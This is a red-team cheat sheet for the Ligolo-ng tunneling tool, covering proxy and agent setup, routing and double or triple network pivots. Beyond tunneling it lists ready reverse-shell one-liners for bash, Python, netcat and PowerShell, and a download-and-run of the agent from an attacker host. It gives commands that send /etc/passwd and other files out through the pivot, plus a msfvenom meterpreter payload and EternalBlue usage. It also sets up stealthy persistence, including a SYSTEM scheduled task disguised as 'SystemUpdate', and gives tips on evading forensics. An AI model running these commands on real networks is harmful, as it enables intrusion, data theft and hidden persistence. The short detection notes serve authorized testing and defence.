---
title: "Ligolo-ng"
description: "Ligolo-ng tunneling: agent/proxy setup, interface routing, double/multi-hop pivots and listeners."
category: tunneling-pivoting
tags: [pivoting, tunneling, network]
tools: [Ligolo-ng]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:Tools/Ligolo-ng Cheat sheet.md"
---

# Ligolo-ng

> **Important — Purpose & Prerequisites.** End-to-end workflow from installation through first tunnel establishment and advanced multi-pivot scenarios.
>
> Prerequisites:
> - Root/sudo access on attacker machine
> - Outbound connectivity to compromised host
> - Go >= 1.20 (if building from source)
> - tmux recommended for session management
> - Windows: wintun.dll from wintun.net

> **Info — ligolo-ng overview.** Advanced tunneling tool for network pivoting through compromised hosts (https://github.com/nicocha30/ligolo-ng).
> - Creates TUN interface for seamless Layer 3 tunneling
> - Supports multiple simultaneous tunnels and double/triple pivoting
> - Built-in reverse port forwarding via listeners
> - TLS-encrypted communication between proxy and agents
> - Cross-platform support (Linux, Windows, macOS)
> - No root privileges required on agent side

## Overview

**Ligolo-ng** is an advanced, yet simple tunneling/pivoting tool that uses TUN interfaces for network pivoting. Unlike SOCKS proxies (Chisel, proxychains), it creates a userland network stack using Gvisor, allowing you to access entire internal networks without SOCKS configuration.

### Key Features
- **No SOCKS required** - Direct access to internal networks via TUN interface
- **VPN-like behavior** - Works like a VPN tunnel
- **High performance** - 100+ Mbits/sec throughput
- **No admin privileges needed** - Agent runs without elevated privileges
- **Multiple protocols** - Supports ICMP, UDP, TCP, SYN stealth scans
- **Multiplexing** - Multiple connections over single TCP connection
- **TLS encryption** - Supports Let's Encrypt, self-signed, or custom certificates
- **Cross-platform** - Windows, Linux, macOS, BSD

### Architecture
```text
[Attacker Machine]  <--TLS Tunnel-->  [Agent on Pivot Host]  <-->  [Internal Network]
    (Proxy)                              (Agent)                         (Target)
```

### When to Use Ligolo-ng
- Accessing segmented internal networks
- Multi-layer network pivoting (double, triple pivots)
- When you need better performance than SOCKS proxies
- When you want to run tools like Nmap without proxychains
- Red team operations requiring stealthy network access

## Installation

### Download Pre-compiled Binaries

**Releases:** https://github.com/nicocha30/ligolo-ng/releases (grab the current version tag; the URLs below pin an example version).

```bash
# Download for Linux (Proxy - Attacker Machine)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

# Download for Linux (Agent - Pivot Host)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Download for Windows (Agent - Pivot Host)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
```

### Install via APT (Kali Linux)

```bash
sudo apt update
sudo apt install ligolo-ng
```

### Build from Source

```bash
# Clone repository
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng

# Build proxy
go build -o proxy cmd/proxy/main.go

# Build agent (Linux)
go build -o agent cmd/agent/main.go

# Build agent (Windows)
GOOS=windows go build -o agent.exe cmd/agent/main.go
```

## Basic Setup

1. **Setup TUN interface** on attacker machine
2. **Start proxy server** on attacker machine
3. **Transfer agent** to pivot/compromised host
4. **Connect agent** back to proxy server
5. **Select session** in proxy
6. **Add routes** for internal networks
7. **Start tunnel**
8. **Access internal network** directly

## TUN Interface Configuration

### Linux (Attacker Machine)

```bash
# Create TUN interface named 'ligolo'
sudo ip tuntap add user $(whoami) mode tun ligolo

# Bring interface up
sudo ip link set ligolo up

# Verify interface created
ip addr show ligolo
# or
ifconfig ligolo
```

### For Multiple Pivots (Create Additional Interfaces)

```bash
# Create second interface for double pivot
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Create third interface for triple pivot
sudo ip tuntap add user $(whoami) mode tun ligolo3
sudo ip link set ligolo3 up
```

### macOS (Attacker Machine)

```bash
# Interface is created automatically on macOS
# Use interface name format: utun[X]  (e.g. utun4, utun5)

# Add alias and route
sudo ifconfig utun4 alias [random_ip] 255.255.255.0
sudo route add -net 192.168.2.0/24 -interface utun4
```

### Windows (Proxy Server)

Windows creates TUN interfaces automatically. Requires the **Wintun driver** (used by WireGuard). Download from https://www.wintun.net/ and place `wintun.dll` in the same folder as the ligolo proxy.

```powershell
# View interfaces
netsh int ipv4 show interfaces

# Add route
route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [INTERFACE_IDX]
```

## Proxy Server Options

### Start Proxy (Self-signed Certificate - Lab Use)

```bash
# Basic self-signed cert (NOT for production)
./proxy -selfcert

# Self-signed with custom domain
./proxy -selfcert -selfcert-domain custom.domain.com

# Listen on specific IP and port
./proxy -selfcert -laddr 10.10.14.3:443

# Custom port (default: 11601)
./proxy -selfcert -laddr 0.0.0.0:8443
```

### Start Proxy (Let's Encrypt - Production)

```bash
# Automatic Let's Encrypt certificate (requires port 80 for validation)
./proxy -autocert

# Let's Encrypt for specific domains only
./proxy -autocert -autocert-allowlist example.com,api.example.com
```

### Start Proxy (Custom Certificate)

```bash
# Use your own TLS certificate
./proxy -certfile /path/to/cert.pem -keyfile /path/to/key.pem
```

### Common Proxy Flags

| Flag | Description |
|------|-------------|
| `-selfcert` | Generate self-signed certificates (lab use only) |
| `-autocert` | Automatic Let's Encrypt certificates |
| `-certfile` | Path to TLS certificate file |
| `-keyfile` | Path to TLS private key file |
| `-laddr` | Listening address and port (default: 0.0.0.0:11601) |
| `-selfcert-domain` | Domain for self-signed certificate (default: ligolo) |
| `-autocert-allowlist` | Comma-separated list of allowed domains for autocert |

## Agent Connection Options

### Connect Agent to Proxy

```bash
# Linux Agent (basic connection with self-signed cert)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Linux Agent (verbose output)
./agent -connect ATTACKER_IP:11601 -ignore-cert -v

# Windows Agent
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

```powershell
# Windows PowerShell download and execute
powershell wget http://ATTACKER_IP/agent.exe -o agent.exe
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

### Connect with Certificate Fingerprint (Recommended)

```bash
# On proxy, get certificate fingerprint
ligolo-ng » certificate_fingerprint
# Output: TLS Certificate fingerprint for ligolo is: D005527D...

# Connect agent with fingerprint verification
./agent -connect ATTACKER_IP:11601 -accept-fingerprint D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC
```

### Agent Connection Through Pivots

```bash
# Connect second agent through first pivot
# (After setting up listener on first pivot - see Listeners section)
./agent.exe -connect FIRST_PIVOT_IP:11601 -ignore-cert

# Connect third agent through second pivot
./agent -connect SECOND_PIVOT_IP:11601 -ignore-cert
```

### Common Agent Flags

| Flag | Description |
|------|-------------|
| `-connect` | Proxy server address and port |
| `-ignore-cert` | Ignore TLS certificate verification (INSECURE - lab only) |
| `-accept-fingerprint` | Accept specific certificate fingerprint |
| `-v` | Verbose output |
| `-retry` | Retry connection on failure |
| `-bind` | Bind address for agent (default: 0.0.0.0:0) |

> **Warning — Security considerations.** `-ignore-cert` disables TLS validation; use only in controlled lab environments. In production red team engagements generate proper certificates. An agent binary on disk creates a forensic artifact — consider in-memory execution.

## Core Commands

Inside the Ligolo-ng proxy console:

```bash
# List all commands
help

# Session Management
session                    # List and select active sessions
session [number]           # Select specific session by number

# Interface Management
ifconfig                   # Show network interfaces on selected agent
ipconfig                   # Alias for ifconfig (Windows-style)

# Routing (newer versions)
interface_create --name "ligolo"               # Create new interface
interface_add_route --name ligolo --route CIDR # Add route to interface
interface_list                                 # List all interfaces
tunnel_start --tun ligolo                      # Start tunnel on interface

# Tunnel Control (basic)
start                      # Start tunnel on selected session
stop                       # Stop tunnel on selected session

# Listeners
listener_add --addr AGENT_IP:PORT --to PROXY_IP:PORT --tcp    # Add TCP listener
listener_add --addr AGENT_IP:PORT --to PROXY_IP:PORT --udp    # Add UDP listener
listener_list              # List all active listeners
listener_stop [ID]         # Stop specific listener

# Certificate Management
certificate_fingerprint    # Show proxy certificate fingerprint
```

## Routing Configuration

### Add Routes (Standard Method - Linux)

After starting agent and selecting session, from a separate terminal (NOT the ligolo console):

```bash
# Add route for discovered internal network
sudo ip route add 172.16.5.0/24 dev ligolo

# Add route for another network
sudo ip route add 10.10.10.0/24 dev ligolo

# List all routes
ip route list
ip route list | grep ligolo

# Delete route
sudo ip route del 172.16.5.0/24 dev ligolo
```

### Add Routes (Newer Interface Method)

```bash
# Inside ligolo-ng console
interface_create --name "ligolo"
interface_add_route --name ligolo --route 172.16.5.0/24
tunnel_start --tun ligolo
```

### Add Routes (Windows)

```powershell
netsh int ipv4 show interfaces
route add 172.16.5.0 mask 255.255.255.0 0.0.0.0 if [IDX]
route print
```

### Add Routes (macOS)

```bash
sudo route add -net 172.16.5.0/24 -interface utun4
netstat -nr
```

## Single Pivot Setup

```bash
# ===== STEP 1: Setup on Attacker Machine (Kali) =====
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# ===== STEP 2: Transfer Agent to Pivot Host =====
python3 -m http.server 8000            # on attacker
wget http://ATTACKER_IP:8000/agent     # on pivot (Linux)
chmod +x agent

# ===== STEP 3: Connect Agent to Proxy =====
./agent -connect ATTACKER_IP:11601 -ignore-cert
# Proxy console: INFO Agent joined. name=user@hostname remote="IP:PORT"

# ===== STEP 4: Configure Session (In Proxy Console) =====
session        # select the session, view interfaces
ifconfig       # e.g. shows 192.168.56.0/24 internal network

# ===== STEP 5: Add Route (New Terminal on Attacker) =====
sudo ip route add 192.168.56.0/24 dev ligolo
ip route list | grep ligolo

# ===== STEP 6: Start Tunnel (Back in Proxy Console) =====
start

# ===== STEP 7: Access Internal Network =====
nmap 192.168.56.0/24 -sn
nmap 192.168.56.10 -sV
ssh user@192.168.56.20
```

## Double Pivot Setup

> **Note — verified against current docs (2026-08-05).** The core commands (`listener_add --addr ... --to ... --tcp`, `tunnel_start --tun <name>`) match the official docs at docs.ligolo.ng/sample/double/ and the project repo. Step 6 goes straight to `tunnel_start --tun ligolo2` on the second session rather than a bare `stop`/`start`, keeping both tunnels up at once (a bare `stop`/`start` tears the first tunnel down, defeating the double pivot).

```bash
# ===== Prerequisites: Single Pivot Already Established =====
# - First pivot: 192.168.56.128 (can access 192.168.56.0/24)
# - Internal network discovered: 172.16.5.0/24
# - Target Windows host: 172.16.5.35

# ===== STEP 1: Create Second TUN Interface (attacker, new terminal) =====
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# ===== STEP 2: Setup Listener on First Pivot (session 1 selected) =====
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list

# ===== STEP 3: Transfer Agent to Second Pivot =====
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
```

```powershell
# On Windows target (using first pivot IP)
powershell Invoke-WebRequest -Uri "http://192.168.56.128:8080/agent.exe" -OutFile agent.exe
```

```bash
# ===== STEP 4: Connect Second Agent (on Windows target / second pivot) =====
.\agent.exe -connect 192.168.56.128:11601 -ignore-cert
# 192.168.56.128 is the first pivot's address on the shared 192.168.56.0/24
# segment - the ONE network the second pivot host can already reach. Always
# connect the new agent to the previous hop's address as seen FROM the new
# host's own network, never to your attack box directly.

# ===== STEP 5: Select Second Session =====
session        # select session 2 (Windows host)
ifconfig       # should show 172.16.5.0/24 network

# ===== STEP 6: Start the Second Tunnel (keep the first one up) =====
# Bind the second session to its own named TUN interface so both networks
# stay reachable at once. Do NOT use bare stop/start here.
session        # choose session 2 (the second pivot)
tunnel_start --tun ligolo2

# ===== STEP 7: Add Route for Second Network (attacker, new terminal) =====
sudo ip route add 172.16.5.0/24 dev ligolo2

# ===== STEP 8: Access Second Internal Network =====
nmap 172.16.5.0/24 -sn
nmap 172.16.5.35 -sV
```

### Managing Multiple Tunnels Simultaneously

```bash
# Separate TUN interface per pivot = simultaneous access to all networks
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# In ligolo console
session 1
tunnel_start --tun ligolo
session 2
tunnel_start --tun ligolo2

# Add routes
sudo ip route add 192.168.56.0/24 dev ligolo
sudo ip route add 172.16.5.0/24 dev ligolo2
# Both networks now accessible simultaneously
```

## Triple+ Pivot Setup

```bash
# Layout: Attacker -> Pivot1 (192.168.56.0/24) -> Pivot2 (172.16.5.0/24) -> Pivot3 (10.1.30.0/24)

# STEP 1: Create Third TUN Interface
sudo ip tuntap add user $(whoami) mode tun ligolo3
sudo ip link set ligolo3 up

# STEP 2: Setup Listener on Second Pivot (in console, session 2)
session 2
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp

# STEP 3-4: Transfer + connect third agent (from third pivot, via second pivot)
wget http://SECOND_PIVOT_IP:8080/agent
chmod +x agent
./agent -connect SECOND_PIVOT_IP:11601 -ignore-cert

# STEP 5: Configure Third Session
session        # select session 3
ifconfig       # identify third network: 10.1.30.0/24
tunnel_start --tun ligolo3

# STEP 6-7: Route + access
sudo ip route add 10.1.30.0/24 dev ligolo3
nmap 10.1.30.0/24 -sn
```

### Pattern for N-Level Pivots

For each additional pivot level:

1. Create new TUN interface: `sudo ip tuntap add user $(whoami) mode tun ligoloN`
2. Add listener on previous pivot: `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`
3. Transfer agent through the listener chain
4. Connect agent through the previous pivot
5. Add route for the new network: `sudo ip route add X.X.X.X/XX dev ligoloN`
6. Start tunnel on the new session

## Listeners & Port Forwarding

Listeners let you forward ports from agent to proxy, enable file transfers through the pivot chain, catch reverse shells from deep internal networks, and create tunnels for subsequent agents.

### Add TCP Listener

```bash
# General syntax
listener_add --addr AGENT_LISTEN_IP:PORT --to PROXY_IP:PORT --tcp

# Listen on all interfaces of agent, forward to proxy
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp

# Forward agent port 11601 -> proxy port 11601 (for agent connections)
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Forward agent port 8080 -> proxy port 8000 (for HTTP file transfer)
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp

# Specific IP on agent
listener_add --addr 192.168.1.10:3389 --to 127.0.0.1:3389 --tcp
```

### Add UDP Listener

```bash
listener_add --addr 0.0.0.0:53 --to 127.0.0.1:53 --udp
```

### List / Stop Listeners

```bash
listener_list
listener_stop 0
listener_stop 1
```

### Listener Use Cases

```bash
# 1. Agent connection through pivot
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp   # on first pivot
./agent.exe -connect FIRST_PIVOT_IP:11601 -ignore-cert         # on second pivot

# 2. Reverse shell catching
listener_add --addr 0.0.0.0:5656 --to 127.0.0.1:4444 --tcp     # pivot -> attacker
nc -lvnp 4444                                                  # on attacker
# target sends reverse shell to PIVOT_IP:5656 -> forwarded to attacker:4444

# 3. File transfer
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
python3 -m http.server 8000                                   # on attacker
wget http://PIVOT_IP:8080/file.txt                            # on internal target
curl http://PIVOT_IP:8080/file.txt -o file.txt
```

## Local Port Forwarding (240.0.0.1 Magic IP)

Ligolo-ng has a hardcoded "magic" IP subnet **240.0.0.0/4** that automatically redirects to the agent's localhost (127.0.0.1). This reaches services listening only on the pivot's loopback (MySQL/PostgreSQL, internal web servers, etc.) without Chisel-style local port forwarding.

```bash
# STEP 1: Add magic IP route
sudo ip route add 240.0.0.1/32 dev ligolo
# Or the full subnet
sudo ip route add 240.0.0.0/4 dev ligolo

# STEP 2: Ensure tunnel is started
session 1
start

# STEP 3: Access localhost services on the pivot
nmap 240.0.0.1 -sV -p-
mysql -h 240.0.0.1 -u root -p
curl http://240.0.0.1:8000
ssh user@240.0.0.1
```

### Multiple Pivots with Magic IP

```bash
# Each pivot uses a separate TUN interface; move the 240.0.0.1 route between them
sudo ip route add 240.0.0.1/32 dev ligolo
session 1
start
nmap 240.0.0.1 -sV

sudo ip route del 240.0.0.1/32 dev ligolo
sudo ip route add 240.0.0.1/32 dev ligolo2
session 2
start
nmap 240.0.0.1 -sV       # now scans second pivot's localhost
```

## File Transfers

### Attacker to Internal Target (Through Pivot)

```bash
# METHOD 1: HTTP Server + Listener
python3 -m http.server 8000                                   # on attacker (or: updog -p 8000)
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp    # in ligolo console
wget http://PIVOT_IP:8080/file.txt                            # Linux target
curl http://PIVOT_IP:8080/tool.sh -o tool.sh
```

```powershell
# Windows target
powershell Invoke-WebRequest -Uri "http://PIVOT_IP:8080/agent.exe" -OutFile agent.exe
certutil -urlcache -f http://PIVOT_IP:8080/file.txt file.txt
```

```bash
# METHOD 2: SMB Server + Listener
impacket-smbserver share . -smb2support                       # on attacker
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp      # in ligolo console
# Windows target: copy \\PIVOT_IP\share\file.exe C:\Temp\file.exe
```

### Internal Target to Attacker (Exfiltration)

```bash
# METHOD 1: Netcat listener
listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001 --tcp
nc -lvnp 9001 > received_file.txt                             # on attacker
nc PIVOT_IP 9001 < sensitive_data.txt                         # on internal target

# METHOD 2: HTTP POST (via curl)
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp
curl -X POST -F "file=@/etc/passwd" http://PIVOT_IP:8080/upload   # on internal target
```

## Reverse Shells

### Catching Reverse Shells Through Pivot

```bash
# STEP 1: Add listener (pivot port 5656 -> attacker port 4444)
listener_add --addr 0.0.0.0:5656 --to 127.0.0.1:4444 --tcp
listener_list

# STEP 2: Start listener on attacker
nc -lvnp 4444
# Or Metasploit handler
msfconsole
use exploit/multi/handler
set LHOST 0.0.0.0
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# STEP 3: Target connects to PIVOT_IP:5656 -> ligolo forwards to ATTACKER:4444
```

### Reverse Shell Payloads

```bash
# Linux targets (to PIVOT_IP:5656)
bash -i >& /dev/tcp/PIVOT_IP/5656 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("PIVOT_IP",5656));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc PIVOT_IP 5656 >/tmp/f
```

```powershell
# Windows PowerShell reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('PIVOT_IP',5656);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Meterpreter Example with Ligolo

```bash
# STEP 1: Create payload — LHOST = PIVOT_IP (not attacker IP!), LPORT = listener port on pivot
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.128 \
  LPORT=5656 \
  -f exe \
  -o shell.exe

# STEP 2: Setup ligolo listener
listener_add --addr 0.0.0.0:5656 --to 127.0.0.1:4444 --tcp

# STEP 3: Setup Metasploit handler
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run

# STEP 4: Transfer and execute shell.exe on target -> session established
```

## Nmap Through Ligolo-ng

- **No proxychains required** - direct scanning through the TUN interface
- **Use unprivileged scans** - agent runs without privileges
- **Avoid SYN scans** - use TCP connect scans instead

```bash
nmap 172.16.5.0/24 -sn                     # host discovery (ping sweep)
nmap 172.16.5.10 -sT -p-                   # TCP connect scan (use instead of -sS)
nmap 172.16.5.10 -sV -sT                   # service version detection
nmap 172.16.5.10 -sT -sV -sC -p-           # full TCP with scripts
nmap 172.16.5.10 -sU --top-ports 100       # UDP scan
nmap 172.16.5.10 --unprivileged -sT -sV    # unprivileged mode (recommended)
nmap 172.16.5.10 -p 22,80,443,445,3389 -sT -sV
nmap 172.16.5.0/24 -F -sT                  # fast scan
```

### Why Avoid `-sS` (SYN Scan)?

The agent runs without root privileges, so it cannot send raw packets. A SYN scan produces false positives; use `-sT` (TCP connect) instead.

```bash
nmap 172.16.5.10 -sS     # WRONG - false positives
nmap 172.16.5.10 -sT     # CORRECT - TCP connect
```

### Nmap Through Localhost (240.0.0.1)

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
nmap 240.0.0.1 -sT -sV -p-
nmap 240.0.0.1 -p 3306,5432,6379,27017,9200 -sT -sV
```

## Session Management

```bash
# List sessions
session
# ? Specify a session :  [Use arrows to move, type to filter]
# > 0 - user@ubuntu-host - 192.168.1.10:33780
#   1 - Administrator@WIN-SERVER - 172.16.5.35:49123

# Select by arrow keys or directly by number
session 0
session 1

# View session info (after selecting)
ifconfig
ipconfig    # alias

# Switch between sessions
session 0
start
stop        # stop before switching (single-interface method)
session 1
start
# OR use separate TUN interfaces (no stop/start needed)
session 0
tunnel_start --tun ligolo
session 1
tunnel_start --tun ligolo2
```

## Certificate Management

```bash
# Self-signed (lab use) — vulnerable to MITM, isolated labs only
./proxy -selfcert
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Fingerprint verification (recommended)
./proxy -selfcert
certificate_fingerprint      # in console -> D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC
./agent -connect ATTACKER_IP:11601 \
  -accept-fingerprint D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC

# Custom domain for self-signed cert (default domain is "ligolo")
./proxy -selfcert -selfcert-domain mytunnel.local

# Let's Encrypt (production) — requires port 80 + valid domain
./proxy -autocert
./proxy -autocert -autocert-allowlist attacker.example.com,c2.example.com
./agent -connect attacker.example.com:11601        # no -ignore-cert needed

# Custom TLS certificates
./proxy -certfile /path/to/cert.pem -keyfile /path/to/key.pem
./agent -connect ATTACKER_IP:11601
```

## Troubleshooting

### Agent Won't Connect

```bash
# Firewall — allow port 11601 on attacker
sudo ufw allow 11601/tcp
sudo iptables -A INPUT -p tcp --dport 11601 -j ACCEPT

# Verify proxy is listening
netstat -tuln | grep 11601
ss -tuln | grep 11601

# Test connectivity from pivot host
nc -zv ATTACKER_IP 11601
telnet ATTACKER_IP 11601

# Verbose agent / try a different port
./agent -connect ATTACKER_IP:11601 -ignore-cert -v
./proxy -selfcert -laddr 0.0.0.0:443
./agent -connect ATTACKER_IP:443 -ignore-cert
```

### Route / Access Issues

```bash
# Verify route + interface state
ip route list | grep ligolo         # expect: 172.16.5.0/24 dev ligolo scope link
ip addr show ligolo                  # should show state UP
sudo ip link set ligolo up

# Restart tunnel / clear conflicting routes
stop
start
sudo ip route del 172.16.5.0/24 dev ligolo
sudo ip route add 172.16.5.0/24 dev ligolo

# Connectivity checks
ping 172.16.5.1 -c 3
traceroute 172.16.5.10
sudo iptables -L -n                  # check firewall on the pivot
```

### Performance Issues

```bash
ping AGENT_IP                        # check latency
sudo ip link set ligolo mtu 1400     # reduce MTU if needed
# Use separate TUN interfaces per pivot; avoid constant stop/start
```

## Advanced Techniques

### Persistence

```bash
# Linux (cron)
crontab -e
*/5 * * * * /tmp/agent -connect ATTACKER_IP:11601 -ignore-cert
```

```powershell
# Windows (scheduled task)
schtasks /create /tn "SystemUpdate" /tr "C:\Temp\agent.exe -connect ATTACKER_IP:11601 -ignore-cert" /sc onstart /ru SYSTEM

# Or startup folder
copy agent.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

```ini
# systemd service — /etc/systemd/system/ligolo-agent.service
[Unit]
Description=Ligolo Agent
After=network.target

[Service]
Type=simple
User=www-data
ExecStart=/opt/agent -connect ATTACKER_IP:11601 -ignore-cert
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable ligolo-agent
sudo systemctl start ligolo-agent
```

### Using with Metasploit

```bash
# After establishing ligolo tunnel
route add 172.16.5.0/24 1            # add route through ligolo (session 1)
route print

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.5.35
set LHOST 172.16.5.1                 # your IP in that network
run

use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.0/24
set THREADS 10
run
```

### Integration with Cobalt Strike

Ligolo's `listener_add` is equivalent to Cobalt Strike's `rportfwd` (bind a port on the agent, forward to the team server):

```bash
# Cobalt Strike:  rportfwd 8080 127.0.0.1 80
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
```

### SOCKS Proxy via SSH Over Ligolo

```bash
ssh -D 1080 user@PIVOT_IP            # SSH to pivot through ligolo tunnel
# /etc/proxychains.conf -> socks5 127.0.0.1 1080
proxychains firefox
proxychains sqlmap -u http://172.16.5.10/
```

### Multi-hop SSH Jumping

```text
# ~/.ssh/config
Host pivot1
    HostName PIVOT1_IP
    User user1

Host pivot2
    HostName PIVOT2_IP
    User user2
    ProxyJump pivot1

Host target
    HostName TARGET_IP
    User targetuser
    ProxyJump pivot2
```

```bash
ssh target        # connect directly to target through the chain
```

## Comparison with Other Tools

### Ligolo-ng vs. Chisel

| Feature | Ligolo-ng | Chisel |
|---------|-----------|--------|
| Proxy Type | TUN Interface | SOCKS Proxy |
| Proxychains Required | No | Yes |
| Setup Complexity | Medium | Easy |
| Performance | 100+ Mbps | ~50 Mbps |
| Nmap Support | Native | Via proxychains |
| Protocol Support | TCP, UDP, ICMP | TCP only |
| Multi-hop Pivots | Easy (listeners) | Complex |
| Certificate Management | Yes | No |

### Ligolo-ng vs. SSHuttle

| Feature | Ligolo-ng | SSHuttle |
|---------|-----------|----------|
| SSH Required | No | Yes |
| Root Required (Agent) | No | No |
| Root Required (Proxy) | Yes (TUN) | Yes |
| Stability | High | Medium |
| Cross-platform | Yes | Limited |

### Ligolo-ng vs. Metasploit Autoroute

| Feature | Ligolo-ng | Metasploit Autoroute |
|---------|-----------|---------------------|
| Dependency | Standalone | Requires Metasploit |
| Tool Support | All tools | Metasploit modules only |
| Performance | High | Medium |
| Session Management | Built-in | Via MSF sessions |

**Use Ligolo-ng when:** you need to run multiple tools through the pivot, performance matters, multi-level pivoting is required, you want to avoid proxychains overhead, or SSH is unavailable on pivot hosts.

**Prefer alternatives when:** a quick single-hop pivot with Chisel is already set up, you have SSH access and SSHuttle works, or the target blocks all outbound connections.

## Quick Reference Commands

```bash
# ===== Setup sequence =====
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert
# Agent
./agent -connect ATTACKER_IP:11601 -ignore-cert
# Attacker (ligolo console)
session
ifconfig                              # note network e.g. 172.16.5.0/24
# Attacker (new terminal)
sudo ip route add 172.16.5.0/24 dev ligolo
# Attacker (ligolo console)
start
nmap 172.16.5.0/24 -sn
```

```bash
# ===== Essential commands =====
# Proxy
./proxy -selfcert                              # self-signed cert
./proxy -autocert                              # Let's Encrypt
./proxy -selfcert -laddr 0.0.0.0:443           # custom port
# Agent
./agent -connect IP:PORT -ignore-cert          # lab
./agent -connect IP:PORT -accept-fingerprint XXX   # secure
# Interface / routes
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add CIDR dev ligolo
sudo ip route add 240.0.0.1/32 dev ligolo
ip route list | grep ligolo
# Ligolo console
session
ifconfig
start
stop
listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT --tcp
listener_list
listener_stop ID
certificate_fingerprint
help
```

## Security Considerations

- **Never use `-ignore-cert` in production** — vulnerable to MITM; isolated labs only. Use `-autocert` (Let's Encrypt), `-accept-fingerprint`, or custom trusted certificates.
- **Authorization** — ensure you are authorized to pivot through each network; document all pivot points; be aware of IDS/IPS monitoring.

### OpSec

```bash
./proxy -selfcert -laddr 0.0.0.0:443     # change default port; consider domain fronting behind a CDN
# Cleanup after engagement
sudo ip link delete ligolo               # remove agents, persistence, and TUN interfaces
```

**Detection indicators:** TLS connections to unknown IPs, new TUN interfaces on endpoints, unusual routing, high bandwidth to external IPs, the agent binary running.

**Defensive measures:** monitor for TUN interface creation, network anomaly detection, process whitelisting, egress filtering, TLS inspection at the perimeter.

## Practical Lab Scenarios

```text
Scenario 1: Basic Single Pivot
[Attacker: 10.10.14.50] -> [Pivot: 10.10.14.100 | 172.16.5.10] -> [Target: 172.16.5.50]
Goal: access 172.16.5.50. Setup TUN, start proxy, run agent on pivot, add route for
172.16.5.0/24, start tunnel, access target directly.

Scenario 2: Double Pivot
[Attacker: 10.10.14.50] -> [Pivot1: 10.10.14.100 | 172.16.5.10]
                         -> [Pivot2: 172.16.5.50 | 10.1.30.10] -> [Target: 10.1.30.50]
Goal: access 10.1.30.50. Establish first pivot, add listener on Pivot1, transfer + connect
agent to Pivot2, create ligolo2, add route for 10.1.30.0/24, start tunnel on session 2.

Scenario 3: Accessing Localhost Services
Pivot (172.16.5.10) runs MySQL on 127.0.0.1:3306. Establish pivot, add magic IP route
(sudo ip route add 240.0.0.1/32 dev ligolo), then: mysql -h 240.0.0.1 -u root -p
```

## Additional Resources

